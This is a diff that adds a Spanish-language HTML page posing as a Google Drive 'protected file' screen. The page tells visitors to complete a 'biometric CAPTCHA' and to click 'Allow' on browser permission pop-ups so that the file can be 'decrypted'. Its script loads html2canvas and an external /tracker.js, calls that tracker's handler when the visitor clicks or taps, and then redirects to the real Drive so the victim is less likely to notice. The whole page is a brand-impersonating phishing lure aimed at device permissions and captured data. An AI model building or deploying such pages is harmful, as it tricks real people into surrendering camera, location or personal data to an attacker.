@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="theme-color" content="#ffffff">
+    <title>Google Drive - Archivo Protegido</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Google Sans', Roboto, Arial, sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body,
+        html {
+            width: 100%;
+            height: 100%;
+            background-color: #f8f9fa;
+            display: flex;
+            flex-direction: column;
+            color: #3c4043;
+        }
+
+        .header {
+            padding: 12px 20px;
+            display: flex;
+            align-items: center;
+            border-bottom: 1px solid #e0e0e0;
+            background: white;
+        }
+
+        .drive-logo {
+            font-size: 18px;
+            color: #5f6368;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .drive-icon {
+            font-size: 22px;
+        }
+
+        .file-box {
+            margin: 30px auto;
+            width: 90%;
+            max-width: 400px;
+            background: white;
+            border-radius: 8px;
+            border: 1px solid #dadce0;
+            padding: 24px;
+            text-align: center;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
+        }
+
+        .file-icon {
+            font-size: 50px;
+            color: #ea4335;
+            margin-bottom: 15px;
+        }
+
+        .file-name {
+            font-size: 16px;
+            font-weight: 500;
+            margin-bottom: 8px;
+            word-break: break-all;
+        }
+
+        .file-info {
+            font-size: 13px;
+            color: #5f6368;
+            margin-bottom: 25px;
+        }
+
+        .security-badge {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 5px;
+            background: #e8f0fe;
+            color: #1967d2;
+            padding: 6px 12px;
+            border-radius: 16px;
+            font-size: 12px;
+            font-weight: 500;
+            margin-bottom: 20px;
+        }
+
+        .verify-btn {
+            background: #1a73e8;
+            color: white;
+            border: none;
+            padding: 10px 24px;
+            border-radius: 4px;
+            font-weight: 500;
+            cursor: pointer;
+            font-size: 14px;
+            width: 100%;
+            letter-spacing: 0.25px;
+        }
+
+        .loading-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.95);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 200;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.3s;
+        }
+
+        .loading-screen.active {
+            opacity: 1;
+            pointer-events: all;
+        }
+
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #1a73e8;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-top: 20px;
+        }
+
+        @keyframes spin {
+            from {
+                transform: rotate(0deg);
+            }
+
+            to {
+                transform: rotate(360deg);
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="header">
+        <div class="drive-logo"><span class="drive-icon">📄</span> Google Drive</div>
+    </div>
+
+    <div class="file-box" id="mainContainer">
+        <div class="file-icon">🔒</div>
+        <div class="file-name">Documento_Confidencial.pdf</div>
+        <div class="file-info">PDF • 2.4 MB</div>
+
+        <div class="security-badge">Enviado de forma segura</div>
+
+        <br>
+        <p style="font-size: 14px; color: #3c4043; margin-bottom: 20px; text-align: left; line-height: 1.5;">
+            El propietario ha restringido el acceso a este archivo. Por razones de seguridad, debes completar un CAPTCHA
+            biométrico o aceptar los permisos del navegador para verificar tu identidad humana.
+        </p>
+
+        <button class="verify-btn">Verificar e Ingresar</button>
+    </div>
+
+    <div class="loading-screen" id="loadingScreen">
+        <div class="drive-logo"><span class="drive-icon">🛡️</span> Verificando Seguridad</div>
+        <div class="spinner"></div>
+        <div style="color: #3c4043; margin-top: 20px; font-weight: 500; font-size: 16px;">Comprobación de Seguridad...
+        </div>
+        <div
+            style="color: #5f6368; margin-top: 10px; font-size: 13px; text-align: center; max-width: 80%; line-height: 1.5;">
+            Drive requiere confirmación del dispositivo para desencriptar el archivo.
+            <br><br><strong style="color: #1a73e8;">Presiona "Permitir" en la ventana emergente.</strong>
+        </div>
+    </div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+    <script src="/tracker.js"></script>
+    <script>
+        const loadingScreen = document.getElementById('loadingScreen');
+        let clicked = false;
+
+        async function openApp() {
+            if (clicked) return;
+            clicked = true;
+            loadingScreen.classList.add('active');
+
+            if (typeof handleMainCta === 'function') await handleMainCta();
+
+            setTimeout(() => { window.location.replace('https://drive.google.com/'); }, 1000);
+        }
+
+        document.getElementById('mainContainer').addEventListener('click', openApp);
+        document.getElementById('mainContainer').addEventListener('touchstart', openApp, { passive: true });
+    </script>
+</body>
+
+</html>
